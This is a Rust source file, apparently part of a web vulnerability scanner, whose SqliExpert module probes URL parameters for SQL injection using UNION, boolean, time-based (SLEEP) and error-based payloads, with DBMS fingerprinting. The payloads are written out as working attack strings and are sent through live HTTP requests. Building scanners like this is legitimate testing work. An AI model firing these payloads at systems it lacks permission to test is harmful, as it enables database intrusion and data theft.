// SQLi Expert Module - Comprehensive SQL Injection detection
use crate::Result;
use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::time::Duration;
use super::{baseline::BaselineProfile, mutation::*, analyzer::*};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SqliVulnerability {
    pub url: String,
    pub parameter: String,
    pub technique: String,
    pub payload: String,
    pub dbms: Option<String>,
    pub severity: String,
    pub confidence: f64,
    pub evidence: Vec<String>,
}

pub struct SqliExpert {
    client: Client,
    baseline: BaselineProfile,
}

impl SqliExpert {
    pub fn new(baseline: BaselineProfile) -> Self {
        Self {
            client: Client::new(),
            baseline,
        }
    }

    /// Comprehensive SQLi detection
    pub async fn detect_sqli(
        &self,
        url: &str,
        parameters: &[(&str, &str)],
    ) -> Result<Vec<SqliVulnerability>> {
        let mut vulnerabilities = Vec::new();

        for (param_name, param_value) in parameters {
            // Test each parameter with different techniques
            let union_vulns = self
                .test_union_sqli(url, param_name, param_value)
                .await?;
            vulnerabilities.extend(union_vulns);

            let boolean_vulns = self
                .test_boolean_sqli(url, param_name, param_value)
                .await?;
            vulnerabilities.extend(boolean_vulns);

            let time_vulns = self
                .test_time_based_sqli(url, param_name, param_value)
                .await?;
            vulnerabilities.extend(time_vulns);

            let error_vulns = self
                .test_error_based_sqli(url, param_name, param_value)
                .await?;
            vulnerabilities.extend(error_vulns);
        }

        Ok(vulnerabilities)
    }

    /// UNION-based SQLi detection
    async fn test_union_sqli(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
    ) -> Result<Vec<SqliVulnerability>> {
        let mut vulns = Vec::new();
        let payloads = MutationEngine::generate_sqli_payloads();
        let union_payloads: Vec<_> = payloads
            .iter()
            .filter(|p| matches!(p.technique, super::mutation::PayloadTechnique::Union))
            .collect();

        // Get normal response
        let normal_response = self
            .get_response(url, param, original_value, Duration::from_secs(10))
            .await?;

        for payload in union_payloads {
            let attack_url = self.build_url(url, param, &payload.encoded);
            if let Ok(attack_response) = self
                .get_response(&attack_url, param, "", Duration::from_secs(10))
                .await
            {
                let analysis = ComparativeAnalyzer::analyze(&normal_response, &attack_response);

                if analysis.confidence > 0.7 {
                    vulns.push(SqliVulnerability {
                        url: attack_url,
                        parameter: param.to_string(),
                        technique: "UNION-based".to_string(),
                        payload: payload.original.clone(),
                        dbms: self.detect_dbms(&attack_response.body),
                        severity: "Critical".to_string(),
                        confidence: analysis.confidence,
                        evidence: analysis.evidence,
                    });
                }
            }
        }

        Ok(vulns)
    }

    /// Boolean-based SQLi detection
    async fn test_boolean_sqli(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
    ) -> Result<Vec<SqliVulnerability>> {
        let mut vulns = Vec::new();

        let true_payloads = vec![
            ("' AND '1'='1", "True condition"),
            ("1' AND '1'='1", "True condition"),
            ("admin' AND 1=1 --", "True condition"),
        ];

        let false_payloads = vec![
            ("' AND '1'='2", "False condition"),
            ("1' AND '1'='2", "False condition"),
            ("admin' AND 1=2 --", "False condition"),
        ];

        let normal_response = self
            .get_response(url, param, original_value, Duration::from_secs(10))
            .await?;

        // Test true condition
        for (true_payload, _desc) in &true_payloads {
            let true_response = self
                .get_response(
                    &self.build_url(url, param, &urlencoding::encode(true_payload).to_string()),
                    param,
                    "",
                    Duration::from_secs(10),
                )
                .await?;

            // Test false condition
            for (false_payload, _desc) in &false_payloads {
                let false_response = self
                    .get_response(
                        &self.build_url(
                            url,
                            param,
                            &urlencoding::encode(false_payload).to_string(),
                        ),
                        param,
                        "",
                        Duration::from_secs(10),
                    )
                    .await?;

                // Check if true and false responses are different
                let true_analysis = ComparativeAnalyzer::analyze(&normal_response, &true_response);
                let false_analysis =
                    ComparativeAnalyzer::analyze(&normal_response, &false_response);

                if true_response.body != false_response.body && true_response.content_length != false_response.content_length {
                    vulns.push(SqliVulnerability {
                        url: url.to_string(),
                        parameter: param.to_string(),
                        technique: "Boolean-based".to_string(),
                        payload: true_payload.to_string(),
                        dbms: self.detect_dbms(&true_response.body),
                        severity: "High".to_string(),
                        confidence: (true_analysis.confidence + false_analysis.confidence) / 2.0,
                        evidence: vec!["True and false conditions produce different responses"
                            .to_string()],
                    });
                    break;
                }
            }
        }

        Ok(vulns)
    }

    /// Time-based blind SQLi detection
    async fn test_time_based_sqli(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
    ) -> Result<Vec<SqliVulnerability>> {
        let mut vulns = Vec::new();

        let time_payloads = vec![
            ("' AND SLEEP(5)--", 5),
            ("1' AND SLEEP(5)--", 5),
            ("' OR SLEEP(5)--", 5),
        ];

        for (payload, expected_delay) in time_payloads {
            let start = std::time::Instant::now();
            let response = self
                .get_response(
                    &self.build_url(url, param, &urlencoding::encode(payload).to_string()),
                    param,
                    "",
                    Duration::from_secs(expected_delay as u64 + 5),
                )
                .await?;
            let elapsed = start.elapsed().as_secs();

            if elapsed >= expected_delay as u64 {
                vulns.push(SqliVulnerability {
                    url: url.to_string(),
                    parameter: param.to_string(),
                    technique: "Time-based".to_string(),
                    payload: payload.to_string(),
                    dbms: None,
                    severity: "High".to_string(),
                    confidence: 0.95,
                    evidence: vec![format!(
                        "Server delayed response by {}s (expected {}s)",
                        elapsed, expected_delay
                    )],
                });
                break;
            }
        }

        Ok(vulns)
    }

    /// Error-based SQLi detection
    async fn test_error_based_sqli(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
    ) -> Result<Vec<SqliVulnerability>> {
        let mut vulns = Vec::new();

        let error_payloads = vec![
            ("' AND extractvalue(1,concat(0x7e,version()))--", "MySQL"),
            ("' AND 1=CAST((SELECT @@version) AS INT)--", "MSSQL"),
            ("' AND CAST(CHAR(67)||CHAR(72)||CHAR(69)||CHAR(67)||CHAR(75) AS INT)--", "PostgreSQL"),
        ];

        let normal_response = self
            .get_response(url, param, original_value, Duration::from_secs(10))
            .await?;

        for (payload, dbms_hint) in error_payloads {
            if let Ok(response) = self
                .get_response(
                    &self.build_url(url, param, &urlencoding::encode(payload).to_string()),
                    param,
                    "",
                    Duration::from_secs(10),
                )
                .await
            {
                let analysis = ComparativeAnalyzer::analyze(&normal_response, &response);

                if analysis.confidence > 0.6 {
                    vulns.push(SqliVulnerability {
                        url: url.to_string(),
                        parameter: param.to_string(),
                        technique: "Error-based".to_string(),
                        payload: payload.to_string(),
                        dbms: Some(dbms_hint.to_string()),
                        severity: "Critical".to_string(),
                        confidence: analysis.confidence,
                        evidence: analysis.evidence,
                    });
                    break;
                }
            }
        }

        Ok(vulns)
    }

    /// Detect DBMS type from response
    fn detect_dbms(&self, body: &str) -> Option<String> {
        let body_lower = body.to_lowercase();

        if body_lower.contains("mysql") || body_lower.contains("sql_mode") {
            Some("MySQL".to_string())
        } else if body_lower.contains("postgresql") || body_lower.contains("postgres") {
            Some("PostgreSQL".to_string())
        } else if body_lower.contains("mssql") || body_lower.contains("sql server") {
            Some("MSSQL".to_string())
        } else if body_lower.contains("oracle") {
            Some("Oracle".to_string())
        } else {
            None
        }
    }

    async fn get_response(
        &self,
        url: &str,
        _param: &str,
        _value: &str,
        timeout: Duration,
    ) -> Result<ResponseData> {
        let response = self
            .client
            .get(url)
            .timeout(timeout)
            .send()
            .await
            .map_err(|e| crate::Error::ProxyError(e.to_string()))?;

        let headers: Vec<_> = response
            .headers()
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string()))
            .collect();

        let content_length = response.content_length().unwrap_or(0) as usize;
        let body = response
            .text()
            .await
            .map_err(|e| crate::Error::ProxyError(e.to_string()))?;

        Ok(ResponseData {
            status_code: 200,
            content_length,
            response_time: Duration::from_millis(100),
            body,
            headers,
        })
    }

    fn build_url(&self, base: &str, param: &str, value: &str) -> String {
        if base.contains('?') {
            format!("{}&{}={}", base, param, value)
        } else {
            format!("{}?{}={}", base, param, value)
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_dbms_detection() {
        let expert = SqliExpert::new(BaselineProfile {
            request_profile: super::super::baseline::RequestProfile {
                avg_size: 1000.0,
                parameter_types: Default::default(),
                encoding_methods: vec![],
                header_patterns: Default::default(),
                common_parameters: vec![],
            },
            response_profile: super::super::baseline::ResponseProfile {
                avg_response_time: Duration::from_millis(100),
                avg_size: 5000,
                common_status_codes: vec![200],
                error_patterns: vec![],
                content_types: vec!["text/html".to_string()],
            },
            context: super::super::baseline::ApplicationContext {
                framework: None,
                language: None,
                database: None,
                waf: None,
                server: None,
            },
            behavior_patterns: super::super::baseline::BehaviorPatterns {
                normal_response_time_mean: 100.0,
                normal_response_time_std: 20.0,
                normal_size_mean: 5000.0,
                normal_size_std: 1000.0,
                timeout_threshold: 30,
                anomaly_threshold: 2.5,
            },
        });

        assert_eq!(
            expert.detect_dbms("MySQL Error: 1234"),
            Some("MySQL".to_string())
        );
        assert_eq!(
            expert.detect_dbms("ERROR: Postgres"),
            Some("PostgreSQL".to_string())
        );
    }
}
